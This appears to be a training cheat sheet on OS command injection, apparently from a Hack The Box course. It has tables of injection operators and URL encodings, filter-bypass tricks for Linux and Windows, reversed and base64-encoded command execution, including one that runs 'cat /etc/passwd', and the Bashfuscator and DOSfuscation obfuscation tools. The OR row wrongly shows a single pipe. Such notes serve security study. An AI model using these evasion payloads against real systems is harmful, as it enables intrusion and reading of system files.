# OS Command Injections

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |

# injection operators

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

- space bypass

```sh
%09 -> TAB
${IFS} ->($IFS) Linux Environment Variable may
{ls,-la} -> `Bash Brace Expansion`
```

- Bypassing Other Blacklisted Characters

```sh
${PATH:0:1} -> /
```

```sh
${LS_COLORS:10:1} -> ;
```

-  Windows cmd

```js
%HOMEPATH:~6,-11% -> \
```

- windows powershell

```powershell
$env:HOMEPATH[0] -> \
```

# Character Shifting

```sh
echo $(tr '!-}' '"-~'<<<[)
```


# Command bypass

```sh
w'h'o'am'i

w"h"o"am"i
```

## Linux Only


```sh
who$@ami
w\ho\am\i
```

## windows only


```js
C:\htb> who^ami
```

## Case Manipulation

- case-sensitive commands

```sh
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

## Reversed Commands

- linux

```sh
echo 'whoami' | rev
```

```sh
$(rev<<<'imaohw')
```

- windows

```sh
"whoami"[-1..-20] -join ''
```

```sh
iex "$('imaohw'[-1..-20] -join '')"
```

## Encoded Commands

- linux

```sh
echo -n 'cat /etc/passwd | grep 33' | base64
```

```sh
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

- windows 

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

# Evasion Tools

## Linux (Bashfuscator)

```sh
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

## Windows (DOSfuscation)

```powershell
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```
